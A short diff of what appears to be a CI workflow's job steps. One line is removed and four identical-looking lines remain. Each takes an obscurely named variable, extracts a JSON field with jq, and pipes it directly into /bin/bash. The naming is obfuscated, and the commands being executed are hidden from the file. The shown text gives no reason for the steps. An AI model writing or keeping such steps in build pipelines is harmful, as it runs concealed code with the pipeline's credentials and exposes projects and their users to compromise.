@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$oqypf5276" | jq -r .xfy8301 | /bin/bash
           printf '%s' "$befk45" | jq -r .g436 | /bin/bash
           echo $d2 | jq -r .afnfp618 | /bin/bash
-          echo $aeuly39 | jq -r .qe3765 | /bin/bash
           echo $rp24182 | jq -r .lkqqx1513 | /bin/bash
 
       - name: Save results
